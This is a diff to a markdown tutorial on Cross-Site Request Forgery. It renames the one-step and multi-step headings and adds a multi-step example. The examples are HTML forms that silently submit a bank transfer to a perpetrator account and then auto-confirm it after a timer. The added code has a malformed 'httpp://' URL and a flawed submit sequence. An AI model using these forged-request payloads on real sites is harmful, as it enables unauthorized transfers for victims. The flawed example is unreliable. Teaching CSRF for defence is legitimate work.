@@ -50,10 +50,10 @@ The arrow originating from the **Website** doesn't mean that the result a **CSRF
 In our example, the **Website visitor** is the **client** and the **website** is the **server**.
 
 ## CSRF Types 
-### One stage CSRF
+### One-step CSRF
 **One step CSRF** is when the action trigered by the hacker link doesn't need more action to be performed. So in this kind of CSRF the hacker just need to forged a link and send it to the the victim. 
 
-### Multi staged CSRF 
+### Multi-steps CSRF 
 In **multi-step CSRF** the action trigered by the hacker link needs more actions from the victim to be completed.So here, the hacker will forged multi links triggered by time or by others events in order for the CSRF to be completely done.
 ![CSRF multi-steps](items/image.png)
 
@@ -94,7 +94,7 @@ Such a request cannot be delivered using standard **A** or **IMG** tags, but can
 </form>
 ```
 This form will require the user to click on the submit button, but this can be also executed automatically using **JavaScript**: 
-```javascript
+```html
 <body onload="document.forms[0].submit()">
 /*Here is the prior malicious code*/
 <form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
@@ -123,6 +123,29 @@ Such requests can be executed with JavaScript embedded into an exploit page:
 </script>
 <body onload="put()">
 ```
+## Multi-step example 
+Here let's assume that we have the victime is in a landing page(as before) and the action he has done need him to confirm. Then this confirmation or not will be send to the server.
+In this kind of situation, multi-step CSRF is used.
+
+```html
+<form name="transferForm" method="POST" action="http://bank.com/transfer.do">
+    <input type="hidden" name="acct" value="PERPRETOR" />
+    <input type="hidden" name="amount" value="1000" />
+</form>
+
+<form name="confirmForm" method="POST" action="httpp://bank.com/transfer.do">
+    <input type="hidden" name="confirmation" value="yes"/>
+</form>
+
+<script type="text/javascript">
+    window.setTimeout(doFormSubmit, 5000);
+    function doFormSubmit()
+    {
+        document.confirmForm.submit();
+    }
+</script>
+```
+
 ## Presence detection (post-incident)
 Detection of **CSRF** flaws is made via **penetration testing** or **code analysis**. 
 
